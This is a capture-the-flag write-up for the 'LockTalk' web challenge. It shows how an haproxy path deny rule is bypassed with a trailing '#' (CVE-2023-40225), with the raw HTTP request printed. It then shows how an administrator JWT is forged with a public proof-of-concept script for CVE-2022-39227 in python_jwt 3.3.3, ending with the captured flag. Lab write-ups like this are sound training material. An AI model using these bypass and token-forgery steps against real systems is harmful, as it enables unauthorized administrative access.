## Title

Lock Talk

## Description

In "The Ransomware Dystopia," LockTalk emerges as a beacon of resistance against the rampant chaos inflicted by ransomware groups. In a world plunged into turmoil by malicious cyber threats, LockTalk stands as a formidable force, dedicated to protecting society from the insidious grip of ransomware. Chosen participants, tasked with representing their districts, navigate a perilous landscape fraught with ethical quandaries and treacherous challenges orchestrated by LockTalk. Their journey intertwines with the organization's mission to neutralize ransomware threats and restore order to a fractured world. As players confront internal struggles and external adversaries, their decisions shape the fate of not only themselves but also their fellow citizens, driving them to unravel the mysteries surrounding LockTalk and choose between succumbing to despair or standing resilient against the encroaching darkness.

## Solution

After analyzing the web application files we retrieved the following information:
- Programming language: Python
- Other config services: haproxy
- The web app has an api endpoint with the following routeS:
    - `/get_ticket`: Endpoint to get the guest JWT token to use the chat endpoint
    - `/chat/<int:chat_id>`: Endpoint  that receives a chat_id that its an int and needs guest or admin role
    - `/flag`: Endpoint that shows the challenge flag but needs the admin role(admin JWT token)
    - There is a middleware that ensures the security of the endpoints that uses roles(middleware.py).
    - There is only one administrator JWT token that is created when the web app is initialized and its an RSA token with the size of 2048(Can't bruteforce )
    - If we can grab the administrator JWT token we can impersonate as administrator and call the `/flag` endpoint to retrieve the flag.
    - Goal: Get the Administrator JWT token.
- Besides that the web app has a endpoint in `/`.

We have a problem:
- We can't obtain the guest token since its been blocked by haproxy:

```
frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend

    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
    
```

The following configuration blocks every request that the path begins with /api/v1/get_ticket and decode the url.
Since we need bypass haproxy and the version is 2.8.1, we search for CVE's: `https://repology.org/project/haproxy/cves?version=2.8.1`.
- https://nvd.nist.gov/vuln/detail/CVE-2023-40225
- https://nvd.nist.gov/vuln/detail/CVE-2023-45539

The first CVE(**CVE-2023-40225**) worked!!
An explanation is here: `https://lists.debian.org/debian-lts-announce/2023/12/msg00010.html`
If we call the `/api/v1/get_ticket` with a `#` character at the end it works

```
GET /api/v1/get_ticket# HTTP/1.1
Host: 94.237.62.149:47578
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://94.237.62.149:47578/
X-Requested-With: XMLHttpRequest
DNT: 1
Connection: close
```

Then we add the ticket like `Authorization: eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNzI4NzYsImlhdCI6MTcxMDE2OTI3NiwianRpIjoidDFXR3pnVUlpaFBQbmhDY2prNlloZyIsIm5iZiI6MTcxMDE2OTI3Niwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.VzLVYMdIyZj-KJwh3CJpOZoLxqTnAaV9iNA8T0XUzdfAsDVjDp9dN33jYlOebVKFRiq_N886ltoCENffw9N6x67qX4LNLugmCWBJ0RZq3X7qkttHQ7zMAm-RtL47ZRB1CZ_wKRB9tmKrLz_LB-4uLvzd6gsMPF5Uquhn3afiyq_se4UyvUCUEDEJixbRMpzhTTcyKrwp85cQ5_ZluA9Do8sxFFAUOfuDP5Vd_ajUfB5QYC0GsBTkyD7qtKVrdw8uTOIq2dkKB8MvUQGEYRl68syATuaeaJ6wnaBxsLWez4Q5hLxRpY-ezqKS58722PT_yzzc3AdcH84WuiF2auNWYw`

Next challenge is to try to impersonate as the adminitrator role and call the flag endpoint.
I try to use [`jwt_tool`](https://github.com/ticarpi/jwt_tool) to change our token to the admin role but the middleware verifies the signature and denies it.

After trying directory transversal throught the `/api/v1/chat` and not being successful I decided to look for the version of the package that verifies and generates the jwt tokens. I found odd that in the requirements.txt it uses a specific version:

```
uwsgi
Flask
requests
python_jwt==3.3.3
```

Looking for vulnerabilities of that particular version I [found](https://github.com/advisories/GHSA-5p8v-58qm-c7fp) a critical vulnerability that lets us forge new claims. Another link [here](https://github.com/davedoesdev/python-jwt/security/advisories/GHSA-5p8v-58qm-c7fp).

Looking for pocs of that CVE(**CVE-2022-39227**) I found [this](https://github.com/user0x1337/CVE-2022-39227).
I added the role of administrator and generate a new token.

```
python3 cve_2022_39227.py  -j eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNzM3NjAsImlhdCI6MTcxMDE3MDE2MCwianRpIjoidHk1WEdZTEtIc2NDQm93YzAteEZ5USIsIm5iZiI6MTcxMDE3MDE2MCwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.QuccsaQ_NHGETQLBnD-bZC1IeyIRo5nJgbK0ZHTynvx-yDf9lZVmlG1DkJdJ7jKLD1hD0CCJoO-eGc2Fk_4u3UHvcuF2XzUj0qOyHlkAMkkDx2BnwfryFUZkMN7TdctmZo5MbM5Oq3MSAVj7vTHU2r8PHJprDkmxP1KcLNPx5YOl27GoHRBXnJ9Hhs1S8CPbvwPOaSTXd5VUvNGcINKIYvvXYFD4RUnUyBtBR3LnTMqa5S12EfgSglZpaUCIYXLrSxons70VLIjqT8BhraAorLPiBkzjDR0RrszlUihNHRwFF_GATsuKmnoEmQsDjQmVsTp-MNn3gjdBfQxgXz0VQQ -i role=administrator
```

After that i called the flag endpoint and got the flag: `HTB{h4Pr0Xy_n3v3r_D1s@pp01n4s}`
